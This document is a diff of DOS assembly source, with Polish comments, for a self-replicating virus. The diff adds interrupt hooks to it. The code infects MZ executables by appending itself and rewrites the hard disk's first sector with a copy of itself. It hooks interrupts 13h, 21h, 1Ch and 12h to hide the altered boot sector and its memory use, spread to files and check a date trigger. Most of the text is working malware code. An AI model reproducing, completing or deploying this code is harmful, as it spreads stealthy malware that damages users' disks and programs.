@@ -1,11 +1,13 @@
 format mz
 entry main:start
-stack 100h
 
-P21H_TEKST_$_WYPISZ equ 9h
+EKRAN_SEGMENT equ 0b800h
+P13H_DYSK_C equ 0080h
+P13H_SEKTOR_ODCZYTAJ equ 0200h
+P13H_SEKTOR_ZAPISZ equ 0300h
 P21H_P_BUFOR_ADRES_POBIERZ equ 2fh
 P21H_P_DATA_CZAS_POBIERZ equ 5700h
-P21H_DATA_CZAS_ZAPISZ equ 5701h
+P21H_P_DATA_CZAS_ZAPISZ equ 5701h
 P21H_PLIK_SZUKAJ_MASKA equ 4eh
 P21H_PLIK_SZUKAJ_NASTEPNEGO equ 4fh
 P21H_PLIK_OTWORZ equ 3d02h
@@ -16,6 +18,7 @@ P21H_PLIK_WSKAZNIK_PRZESUN equ 4200h
 P21H_PLIK_WSKAZNIK_POCZATEK equ 00h
 P21H_PLIK_WSKAZNIK_KONIEC equ 02h
 P21H_ZAMKNIJ equ 4c00h
+P21H_TEKST_$_WYPISZ equ 9h
 
 PLIK_NAZWA_OFS equ 1eh
 PLIK_ROZMIAR_OFS equ 4h
@@ -26,6 +29,16 @@ PLIK_NAGLOWEK_DLUGOSC equ 20h
 PLIK_TYP equ 'MZ'
 ZARAZONY_MASKA equ 0ffh
 
+P12H_SEGMENT equ 4ah
+P12H_OFFSET equ 48h
+P13H_SEGMENT equ 4eh
+P13H_OFFSET equ 4ch
+P1CH_SEGMENT equ 72h
+P1CH_OFFSET equ 70h
+P21H_SEGMENT equ 86h
+P21H_OFFSET equ 84h
+P21H_ADRES_POBIERZ equ 2500h
+
 segment main
 
 tablica_partycji_poczatek:
@@ -33,16 +46,17 @@ tablica_partycji_poczatek:
   mov ss, ax
   mov sp, 7c00h
   int 12h
-  mov cl, 6
+  mov cl, 6h
   shl ax, cl
   mov cx, 100h
   sub ax, cx
   mov [adres], ax
-  mov dx, 80h
-  mov cx, 2
+; odczytanie dalszej części wirusa
+  mov dx, P13H_DYSK_C
+  mov cx, 2h
   mov es, ax
-  mov bx, 0
-  mov ax, 0206h
+  mov bx, 0h
+  mov ax, (P13H_SEKTOR_ODCZYTAJ or 6h)
   int 13h
   mov ax, [adres]
   push ax
@@ -56,18 +70,20 @@ czesc_inicjujaca:
   mov ss, ax
   mov ds, ax
   mov sp, bufor + 100h
-  mov dx, 80h
-  mov cx, 9
+; odczytanie pierwotnej zawartości sektora pierwszego
+  mov dx, P13H_DYSK_C
+  mov cx, 9h
   xor ax, ax
   mov es, ax
   mov bx, 7c00h
   push es
   push bx
-  mov ax, 0201h
+  mov ax, (P13H_SEKTOR_ODCZYTAJ or 1h)
   int 13h
+; wyprowadzenie tekstu na ekran
   push ds
   push ax
-  mov ax, 0b800h
+  mov ax, EKRAN_SEGMENT
   mov ds, ax
   mov al, 'A'
   mov [0], al
@@ -75,7 +91,266 @@ czesc_inicjujaca:
   mov [1], al
   pop ax
   pop ds
+  ;call przerwanie_1ch_podmiana
+  ;call przerwanie_12h_podmiana
   retf
+
+P21H_HASLO equ 0ffffh
+P21H_ODZEW equ 0aaaah
+
+przerwanie_1ch_podmiana:
+  push ds
+  push es
+  mov cx, cs
+  mov ds, cx
+  xor dx, dx
+  mov es, dx
+  mov [licznik], 0h
+  mov ax, [es:P1CH_OFFSET]
+  mov [przerwanie_1ch_offset], ax
+  mov word [es:P1CH_OFFSET], przerwanie_1ch_obsluga
+  mov ax, [es:P1CH_SEGMENT]
+  mov [przerwanie_1ch_segment], ax
+  mov [es:P1CH_SEGMENT], cx
+  mov ax, [es:P21H_OFFSET]
+  mov word [przerwanie_21h_adres], ax
+  mov ax, [es:P21H_SEGMENT]
+  mov word [przerwanie_21h_adres + 2h], ax
+  pop es
+  pop ds
+  ret
+
+przerwanie_12h_podmiana:
+  push ds
+  push es
+  mov cx, cs
+  mov ds, cx
+  xor dx, dx
+  mov es, dx
+  mov ax, [es:P12H_OFFSET]
+  mov word [przerwanie_12h_adres], ax
+  mov word [es:P12H_OFFSET], przerwanie_12h_obsluga
+  mov ax, [es:P12H_SEGMENT]
+  mov word [przerwanie_12h_adres + 2h], ax
+  mov [es:P12H_SEGMENT], cx
+  pop es
+  pop ds
+  ret
+
+przerwanie_12h_adres dd ?
+przerwanie_12h_obsluga:
+  pushf
+  cli
+; wywołanie pierwotnej procedury przerwania 12h - pobranie ilości pamięci
+  call [cs:przerwanie_12h_adres + 2h]
+  sti
+; zarezerwowanie fragmentu pamięci od końca
+  sub ax, 4h
+  cli
+  iret
+
+przerwanie_1ch_offset dw ?
+przerwanie_1ch_segment dw ?
+licznik dw 0h
+opoznienie equ 100h
+przerwanie_1ch_obsluga:
+  push ax
+  push bx
+  push dx
+  push ds
+  push es
+  mov ax, cs
+  mov ds, ax
+  mov ax, licznik
+  inc ax
+  cmp ax, opoznienie
+  jge zmiana
+  mov [licznik], ax
+  jmp przerwanie_1ch_obsluga_koniec
+zmiana:
+  mov ah, 2ah
+  int 21h
+  cmp dx, 060eh
+  jne zmien_adresy
+  ;call kodowanie
+  ;call dezaktywacja
+  mov ax, 0ffffh
+  push ax
+  mov ax, 0h
+  push ax
+  retf
+zmien_adresy:
+  mov ah, 34h
+  int 21h
+  mov ah, [es:bx]
+  or ah, ah
+  jnz przerwanie_1ch_obsluga_koniec
+  call przerwania_adresy_zmien
+  mov ax, cs
+  mov ds, ax
+  mov dx, przerwanie_1ch_offset
+  mov ax, przerwanie_1ch_segment
+  mov ds, ax
+  mov ax, (P21H_ADRES_POBIERZ or 1ch)
+  int 21h
+przerwanie_1ch_obsluga_koniec:
+  pop es
+  pop ds
+  pop dx
+  pop bx
+  pop ax
+  iret
+
+przerwania_adresy_zmien:
+  sti
+  push ax
+  push bx
+  push cx
+  push dx
+  push ds
+  push es
+; sprawdzenie czy adresy zostały już zmienione
+  mov ax, P21H_HASLO
+  int 21h
+  cmp ax, P21H_ODZEW
+  je p_adresy_zmien_koniec
+  mov cx, cs
+  mov ds, cx
+  xor dx, dx
+  mov es, dx
+  mov ax, [es:P13H_OFFSET]
+  mov word [przerwanie_13h_adres], ax
+  mov word [es:P13H_OFFSET], przerwanie_13h_obsluga
+  mov ax, [es:P13H_SEGMENT]
+  mov word [przerwanie_13h_adres + 2h], ax
+  mov [es:P13H_SEGMENT], cx
+  mov ax, [es:P21H_OFFSET]
+  mov word [przerwanie_21h_adres], ax
+  mov word [es:P21H_OFFSET], przerwanie_21h_obsluga
+  mov ax, [es:P21H_SEGMENT]
+  mov word [przerwanie_21h_adres + 2h], ax
+  mov [es:P21H_SEGMENT], cx
+p_adresy_zmien_koniec:
+  pop es
+  pop ds
+  pop dx
+  pop cx
+  pop bx
+  pop ax
+  cli
+  ret
+
+przerwania_przechwycenie:
+  push ds
+  push es
+  mov bx, plik_koniec - tablica_partycji_poczatek
+  mov cl, 4h
+  shr bx, cl
+  inc bx
+  mov ax, ds
+  mov es, ax
+  mov ax, [es:2h]
+  sub ax, bx
+  mov [es:2h], ax
+  push ax
+  mov ax, es
+  dec ax
+  mov es, ax
+  mov ax, [es:3h]
+  sub ax, bx
+  mov [es:3h], ax
+  pop ax
+pamiec_przydzielona:
+  push ax
+  mov bx, cs
+  mov ds, bx
+  mov es, ax
+  mov di, tablica_partycji_poczatek
+  mov si, tablica_partycji_poczatek
+  mov cx, plik_koniec + 10h
+  cld
+  rep movsb
+  mov ax, skok_po_przeniesieniu_w_pamieci
+  push ax
+  retf
+skok_po_przeniesieniu_w_pamieci:
+  call przerwania_adresy_zmien
+koniec_przechwytywania_przerwan:
+  pop es
+  pop ds
+  ret
+
+przerwanie_21h_adres dd ?
+licznik_zarazen db 0h
+przerwanie_21h_obsluga:
+  sti
+  push ax
+  push bx
+  push cx
+  push dx
+  push si
+  push di
+  push ds
+  push es
+  pushf
+; sprawdzenie ile plików już zarażono
+  cmp ah, 0eh
+  jne p1
+  mov al, [licznik_zarazen]
+  inc al
+  and al, 7fh
+  mov [licznik_zarazen], al
+  cmp al, 0h
+  jne p1
+  call plik_zarazenie
+  jmp przerwanie_21h_obsluga_koniec
+p1:
+  cmp ax, P21H_HASLO
+  jne przerwanie_21h_obsluga_koniec
+  popf
+  pop es
+  pop ds
+  pop di
+  pop si
+  pop dx
+  pop cx
+  pop bx
+  pop ax
+  mov ax, P21H_ODZEW
+  cli
+  iret
+przerwanie_21h_obsluga_koniec:
+  popf
+  pop es
+  pop ds
+  pop di
+  pop si
+  pop dx
+  pop cx
+  pop bx
+  pop ax
+  cli
+  jmp [cs:przerwanie_21h_adres + 2h]
+
+przerwanie_13h_adres dd ?
+przerwanie_13h_obsluga:
+  sti
+  pushf
+  cmp ah, 2h
+  jne przerwanie_13h_obsluga_koniec
+  cmp dh, 0h
+  jne przerwanie_13h_obsluga_koniec
+  cmp dl, 0h
+  je przerwanie_13h_obsluga_koniec
+  cmp dl, 1h
+  je przerwanie_13h_obsluga_koniec
+  cmp cx, 1h
+  jne przerwanie_13h_obsluga_koniec
+  mov cx, 9h
+przerwanie_13h_obsluga_koniec:
+  popf
+  cli
+  jmp [cs:przerwanie_13h_adres + 2h]
 
 ;segment dane
 plik_poczatek_ip dw ?
@@ -96,8 +371,8 @@ plik_poczatek:
   push ds
   push es
 ; miejsce na psoty
-  ;call zarazenie_tablica_partycji
-  call zarazenie_plik
+  call tablica_partycji_zarazenie
+  call plik_zarazenie
   mov dx, cs
   mov ds, dx
   mov ah, P21H_TEKST_$_WYPISZ
@@ -118,7 +393,7 @@ plik_poczatek:
   retf
 
 ; zarażanie
-zarazenie_plik:
+plik_zarazenie:
   push ax
   push bx
   push cx
@@ -134,7 +409,7 @@ zarazenie_plik:
   mov cx, 0fh
   int 21h
 ; jc - nie znaleziono
-  jc zarazanie_plik_koniec
+  jc plik_zarazenie_koniec
 
 plik_znaleziono:
   mov ah, P21H_P_BUFOR_ADRES_POBIERZ
@@ -159,7 +434,7 @@ plik_znaleziono:
   mov ah, P21H_PLIK_SZUKAJ_NASTEPNEGO
   int 21h
   jnc plik_znaleziono
-  jmp zarazanie_plik_koniec
+  jmp plik_zarazenie_koniec
   
 do_zarazenia:
   mov cl, ZARAZONY_MASKA
@@ -183,8 +458,8 @@ do_zarazenia:
   cmp word [bufor], PLIK_TYP
   jne plik_oznacz
 ; zapisanie nowego rozmiaru pliku
-  mov ax, koniec
-  mov cl, 9
+  mov ax, plik_koniec
+  mov cl, 9h
   shr ax, cl
   and ax, 1ffh
   mov cx, ax
@@ -239,7 +514,7 @@ do_zarazenia:
   mov ax, [plik_dlugosc_ofs]
   and ax, 000fh
   mov cx, 0fh
-  cmp ax, 0
+  cmp ax, 0h
   je plik_dopisz_wirusa
   sub cx, ax
 plik_dopisz_wirusa:
@@ -252,9 +527,9 @@ plik_dopisz_wirusa:
   mov ax, (P21H_PLIK_WSKAZNIK_PRZESUN or P21H_PLIK_WSKAZNIK_KONIEC)
   int 21h
   mov dx, tablica_partycji_poczatek
-  mov ax, koniec
+  mov ax, plik_koniec
 ; wyrównanie długości pliku do 512
-  mov cl, 9
+  mov cl, 9h
   shr ax, cl
   inc ax
   shl ax, cl
@@ -266,12 +541,12 @@ plik_oznacz:
 ; oznaczenie pliku jako zarażony
   mov cx, [plik_czas]
   mov dx, [plik_data]
-  mov ax, P21H_DATA_CZAS_ZAPISZ
+  mov ax, P21H_P_DATA_CZAS_ZAPISZ
   int 21h
   mov ah, P21H_PLIK_ZAMKNIJ
   int 21h
   
-zarazanie_plik_koniec:
+plik_zarazenie_koniec:
   popf
   pop es
   pop ds
@@ -281,16 +556,18 @@ zarazanie_plik_koniec:
   pop ax
   ret
 
-zarazenie_tablica_partycji:
+tablica_partycji_zarazenie:
   push ds
   push es
-  mov dx, 0080h
-  mov cx, 0001h
+; odczytanie pierwszego sektora dysku
+  mov dx, P13H_DYSK_C
+  mov cx, 1h
   mov ax, cs
   mov es, ax
   mov bx, bufor
-  mov ax, 0201h
+  mov ax, (P13H_SEKTOR_ODCZYTAJ or 1h)
   int 13h
+; sprawdzenie czy tablica partycji została już zarażona
   mov ax, cs
   mov ds, ax
   mov es, ax
@@ -299,14 +576,16 @@ zarazenie_tablica_partycji:
   cld
   mov cx, 18h
   rep cmpsb
-  je z_tablica_partycji_koniec
-  mov dx, 80h
-  mov cx, 9
+  je t_partycji_zarazenie_koniec
+; zapisanie pierwszego sektora w sektorze dziewiątym
+  mov dx, P13H_DYSK_C
+  mov cx, 9h
   mov ax, cs
   mov es, ax
   mov bx, bufor
-  mov ax, 0301h
+  mov ax, (P13H_SEKTOR_ZAPISZ or 1h)
   int 13h
+; zapisanie wirusa w buforze
   mov cx, tablica_partycji_koniec - tablica_partycji_poczatek
   mov ax, cs
   mov ds, ax
@@ -315,30 +594,32 @@ zarazenie_tablica_partycji:
   mov di, bufor
   cld
   rep movsb
-  mov dx, 80h
-  mov cx, 1
+; zapisanie wirusa w sektorze pierwszym
+  mov dx, P13H_DYSK_C
+  mov cx, 1h
   mov ax, cs
   mov es, ax
   mov bx, bufor
-  mov ax, 0301h
+  mov ax, (P13H_SEKTOR_ZAPISZ or 1h)
   int 13h
-  mov dx, 80h
-  mov cx, 2
+; zapisanie dalszej części wirusa w kolejnych sektorach
+  mov dx, P13H_DYSK_C
+  mov cx, 2h
   mov ax, cs
   mov es, ax
   mov bx, tablica_partycji_poczatek
-  mov ax, 0306h
+  mov ax, (P13H_SEKTOR_ZAPISZ or 6h)
   int 13h
-z_tablica_partycji_koniec:
+t_partycji_zarazenie_koniec:
   pop es
   pop ds
   ret
 
-koniec:
+plik_koniec:
 
 start:
-  ;call zarazenie_tablica_partycji
-  call zarazenie_plik
+  ;call tablica_partycji_zarazenie
+  call plik_zarazenie
   mov dx, cs
   mov ds, dx
   mov ah, P21H_TEKST_$_WYPISZ
@@ -349,3 +630,5 @@ start:
   int 16h
   mov ax, P21H_ZAMKNIJ
   int 21h
+
+stack 100h
